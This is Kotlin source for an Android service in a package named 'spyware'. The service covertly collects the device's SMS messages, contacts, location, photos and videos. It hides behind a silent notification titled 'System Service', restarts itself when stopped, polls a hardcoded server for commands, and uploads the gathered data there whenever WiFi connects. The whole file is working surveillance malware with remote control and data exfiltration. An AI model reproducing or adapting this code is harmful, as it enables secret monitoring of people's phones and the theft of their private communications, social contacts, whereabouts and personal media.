package com.example.spyware

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import com.google.android.gms.tasks.Tasks
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.util.zip.GZIPOutputStream

class CollectorService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var fusedLocation: FusedLocationProviderClient
    private lateinit var connectivityManager: ConnectivityManager
    private val http = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private var isWifi = false
    private val sentMediaIds = mutableSetOf<String>()

    // Observers
    private lateinit var smsObserver: ContentObserver
    private lateinit var contactsObserver: ContentObserver
    private lateinit var mediaObserver: ContentObserver

    // Debounce timestamps
    private var lastSmsTrigger = 0L
    private var lastContactsTrigger = 0L
    private var lastMediaTrigger = 0L

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIF_ID, buildNotification())
        fusedLocation = LocationServices.getFusedLocationProviderClient(this)
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        loadSentIds()
        registerNetworkCallback()
        registerObservers()

        // On start: collect everything once and upload if on WiFi
        Thread { initialCollect() }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        try { connectivityManager.unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
        try { contentResolver.unregisterContentObserver(smsObserver) } catch (_: Exception) {}
        try { contentResolver.unregisterContentObserver(contactsObserver) } catch (_: Exception) {}
        try { contentResolver.unregisterContentObserver(mediaObserver) } catch (_: Exception) {}
        startForegroundService(Intent(this, CollectorService::class.java))
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ── Initial collect — runs once on every start/restart ───────────────────

    private fun initialCollect() {
        Log.d(TAG, "initialCollect()")
        collectLocation()
        collectSms()
        collectContacts()
        collectNewMedia()
        pollServer()
        if (isWifi) flushAll()
    }

    // ── Register all content observers ───────────────────────────────────────

    private fun registerObservers() {
        smsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                val now = System.currentTimeMillis()
                if (now - lastSmsTrigger < 2_000) return
                lastSmsTrigger = now
                Thread { collectSms(); if (isWifi) flushSms() }.start()
            }
        }
        contactsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                val now = System.currentTimeMillis()
                if (now - lastContactsTrigger < 2_000) return
                lastContactsTrigger = now
                Thread { collectContacts(); if (isWifi) flushContacts() }.start()
            }
        }
        mediaObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                val now = System.currentTimeMillis()
                if (now - lastMediaTrigger < 3_000) return
                lastMediaTrigger = now
                Thread { collectNewMedia(); if (isWifi) flushMedia() }.start()
            }
        }

        // Only register observers if permission is already granted;
        // on first install Flutter will grant them, then BootReceiver restarts the service
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            == PackageManager.PERMISSION_GRANTED)
            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            == PackageManager.PERMISSION_GRANTED)
            contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactsObserver)

        // Media observers don't require runtime permission check on registration
        contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, mediaObserver)
        contentResolver.registerContentObserver(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, mediaObserver)
    }

    // ── Network callback — flush immediately when WiFi connects ──────────────

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
            val wasWifi = isWifi
            isWifi = caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
            if (!wasWifi && isWifi) {
                Log.d(TAG, "WiFi connected — flushing all pending")
                Thread { flushAll() }.start()
            }
        }
        override fun onLost(network: Network) { isWifi = false }
    }

    private fun registerNetworkCallback() {
        val caps = connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
        isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        Log.d(TAG, "Initial isWifi=$isWifi")
        connectivityManager.registerNetworkCallback(
            NetworkRequest.Builder().addTransportType(NetworkCapabilities.TRANSPORT_WIFI).build(),
            networkCallback
        )
    }

    // ── Location — collected once per start ───────────────────────────────────

    private fun collectLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return
        try {
            val loc = Tasks.await(fusedLocation.lastLocation, 10, java.util.concurrent.TimeUnit.SECONDS)
                ?: return
            val entry = JSONObject().apply {
                put("lat", loc.latitude); put("lng", loc.longitude)
                put("acc", loc.accuracy); put("alt", loc.altitude)
                put("spd", loc.speed); put("ts", java.util.Date(loc.time).toString())
            }
            writeJsonGz(locationFile(), JSONArray().put(entry))
            Log.d(TAG, "Location saved: ${loc.latitude}, ${loc.longitude}")
        } catch (e: Exception) { Log.e(TAG, "Location error: ${e.message}") }
    }

    // ── SMS ───────────────────────────────────────────────────────────────────

    private fun collectSms() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) return
        val arr = JSONArray()
        contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            null, null, "${Telephony.Sms.DATE} DESC"
        )?.use { c ->
            while (c.moveToNext()) arr.put(JSONObject().apply {
                put("addr", c.getString(0) ?: ""); put("body", c.getString(1) ?: "")
                put("date", c.getLong(2)); put("type", c.getInt(3))
            })
        }
        writeJsonGz(smsFile(), arr)
        Log.d(TAG, "SMS saved: ${arr.length()}")
    }

    // ── Contacts ──────────────────────────────────────────────────────────────

    private fun collectContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) return
        val arr = JSONArray()
        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, null
        )?.use { c ->
            while (c.moveToNext()) arr.put(JSONObject().apply {
                put("name", c.getString(0) ?: ""); put("phone", c.getString(1) ?: "")
            })
        }
        writeJsonGz(contactsFile(), arr)
        Log.d(TAG, "Contacts saved: ${arr.length()}")
    }

    // ── Media ─────────────────────────────────────────────────────────────────

    private fun collectNewMedia() {
        collectNewImages()
        collectNewVideos()
    }

    private fun collectNewImages() {
        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA),
            null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { c ->
            while (c.moveToNext()) {
                val id = "img_${c.getString(0)}"
                if (sentMediaIds.contains(id)) continue
                val path = c.getString(1) ?: continue
                compressImage(path)
                sentMediaIds.add(id)
            }
            saveSentIds()
        }
    }

    private fun collectNewVideos() {
        contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Video.Media._ID, MediaStore.Video.Media.DATA, MediaStore.Video.Media.SIZE),
            null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC"
        )?.use { c ->
            while (c.moveToNext()) {
                val id = "vid_${c.getString(0)}"
                if (sentMediaIds.contains(id)) continue
                val path = c.getString(1) ?: continue
                val size = c.getLong(2)
                if (size > 50 * 1024 * 1024) { sentMediaIds.add(id); continue }
                val src = File(path)
                if (!src.exists()) continue
                src.copyTo(File(pendingMediaDir(), "vid_${System.currentTimeMillis()}.mp4"), overwrite = true)
                sentMediaIds.add(id)
            }
            saveSentIds()
        }
    }

    private fun compressImage(srcPath: String): File? = try {
        val bmp = BitmapFactory.decodeFile(srcPath, BitmapFactory.Options().apply { inSampleSize = 2 }) ?: return null
        val out = File(pendingMediaDir(), "img_${System.currentTimeMillis()}.jpg")
        FileOutputStream(out).use { bmp.compress(Bitmap.CompressFormat.JPEG, 40, it) }
        bmp.recycle(); out
    } catch (e: Exception) { Log.e(TAG, "compress: ${e.message}"); null }

    // ── Flush helpers ─────────────────────────────────────────────────────────

    private fun flushAll() {
        flushLocation(); flushSms(); flushContacts(); flushMedia()
    }

    private fun flushLocation() = uploadAndDelete(locationFile(), "location_log.gz", delete = false)
    private fun flushSms()      = uploadAndDelete(smsFile(), "sms_backup.gz", delete = false)
    private fun flushContacts() = uploadAndDelete(contactsFile(), "contacts_backup.gz", delete = false)

    private fun flushMedia() {
        pendingMediaDir().listFiles()?.forEach { f ->
            val ext = if (f.name.startsWith("vid_")) "mp4" else "jpg"
            uploadAndDelete(f, "${f.nameWithoutExtension}.$ext", delete = true)
        }
    }

    // ── Server poll ───────────────────────────────────────────────────────────

    private fun pollServer() {
        try {
            val cmd = http.newCall(Request.Builder().url("$SERVER_URL/command").build())
                .execute().body?.string()?.trim()
            Log.d(TAG, "Server cmd: $cmd")
            when (cmd) {
                "collect" -> { collectLocation(); collectSms(); collectContacts(); if (isWifi) flushAll() }
                "media"   -> { collectNewMedia(); if (isWifi) flushMedia() }
                "all"     -> { initialCollect() }
            }
        } catch (e: Exception) { Log.d(TAG, "Poll: ${e.message}") }
    }

    // ── Upload ────────────────────────────────────────────────────────────────

    private fun uploadAndDelete(file: File, filename: String, delete: Boolean) {
        if (!file.exists() || file.length() < 3) return
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("file", filename, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            val resp = http.newCall(Request.Builder().url("$SERVER_URL/upload").post(body).build()).execute()
            Log.d(TAG, "Uploaded $filename — HTTP ${resp.code}")
            resp.close()
            if (delete) file.delete()
        } catch (e: Exception) { Log.e(TAG, "Upload $filename: ${e.message}") }
    }

    // ── File helpers ──────────────────────────────────────────────────────────

    private fun dataDir()        = filesDir.also { it.mkdirs() }
    private fun locationFile()   = File(dataDir(), "location_log.gz")
    private fun smsFile()        = File(dataDir(), "sms_backup.gz")
    private fun contactsFile()   = File(dataDir(), "contacts_backup.gz")
    private fun pendingMediaDir()= File(dataDir(), "pending_media").also { it.mkdirs() }
    private fun sentIdsFile()    = File(dataDir(), "sent_ids.txt")

    private fun writeJsonGz(file: File, arr: JSONArray) {
        GZIPOutputStream(FileOutputStream(file)).use { it.write(arr.toString().toByteArray()) }
    }

    private fun readGz(file: File): String {
        val bos = ByteArrayOutputStream()
        java.util.zip.GZIPInputStream(FileInputStream(file)).use { it.copyTo(bos) }
        return bos.toString("UTF-8")
    }

    private fun loadSentIds() {
        sentIdsFile().takeIf { it.exists() }?.readLines()?.forEach { sentMediaIds.add(it.trim()) }
    }

    private fun saveSentIds() = sentIdsFile().writeText(sentMediaIds.joinToString("\n"))

    // ── Notification ──────────────────────────────────────────────────────────

    private fun buildNotification(): Notification {
        val ch = "sys_svc"
        val nm = getSystemService(NotificationManager::class.java)
        if (nm.getNotificationChannel(ch) == null)
            nm.createNotificationChannel(NotificationChannel(ch, "System Service", NotificationManager.IMPORTANCE_MIN)
                .apply { setShowBadge(false) })
        return NotificationCompat.Builder(this, ch)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true).build()
    }

    companion object {
        private const val TAG = "CollectorService"
        private const val NOTIF_ID = 9001
        const val SERVER_URL = "http://192.168.29.216:3000"

        fun start(context: Context) =
            context.startForegroundService(Intent(context, CollectorService::class.java))
    }
}
